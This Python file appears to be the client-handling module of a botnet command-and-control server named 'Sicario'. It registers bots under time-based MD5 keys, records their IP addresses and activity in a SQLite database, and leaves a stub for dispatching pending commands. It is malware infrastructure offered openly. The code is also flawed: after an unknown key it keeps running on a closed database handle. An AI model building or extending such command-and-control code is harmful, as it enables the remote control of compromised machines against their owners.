#!/usr/bin/python

import sicario 
import commands
import log
import database

# Sicario C&C server
# High level client class

import time,hashlib

class Client:
	def __init__ (self, address, socket):
		self.during_disconnect = False
		self.registered = False
		self.address = address
		self.socket = socket
	
	def on_command (self, command):
		if self.during_disconnect: return False
		
		# arguments[0] is the command name
		arguments = commands.parse(command)
		
		if self.registered == False and arguments[0] != 'register' and arguments[0] != 'login':
			self.disconnect()
			return False

		db = database.Database({'filename':'db/sicario.db'})
		
		# is it new member? let's check if he provided his key
		if len(arguments) < 2:
			# new member
			log.log('Got new member! ({}). Generating random key..'.format(self.address))
			key = hashlib.md5(str(time.time()*100000)).hexdigest().upper()
			log.log('Key for {} generated: {}'.format(self.address, key))
			self.send_command(['set','key',key])
			
			# now, we should add this to a database
			db.cursor.execute('''INSERT INTO clients (hash, ip, last_active) VALUES (?,?,datetime('now', 'localtime'))''', [key, self.address])
			db.handler.commit()
			db.handler.close()

			# client registered himself, so its time to disconnect him.
			self.disconnect()

		elif len(arguments) == 2 and len(arguments[1]) == 32:
			# already registered member
			key = arguments[1]

			# first we check if our client is registered in the database, if not - we inform him about it
			db.cursor.execute('SELECT * FROM clients WHERE hash=?', [key])
			client = db.cursor.fetchone()

			if not client:
				self.send_command(['error', '1'])
				db.handler.close()
				self.disconnect()

			db.cursor.execute('''UPDATE clients SET last_active = datetime('now', 'localtime'), ip = ? WHERE hash=?''', [self.address, key])

			log.log('{} (key {}) updated himself successfully.'.format(self.address, key))

			# todo: check for pending commands
			db.handler.commit()
			db.handler.close()

			self.disconnect()


	
	def send_command (self, args):
		self.raw_send(commands.encode(args))
	
	def raw_send (self, text):
		self.socket.send(text)
		
	def disconnect (self): # why bother? he will disconnect automatically in 10 seconds
		self.socket.stop()
		return True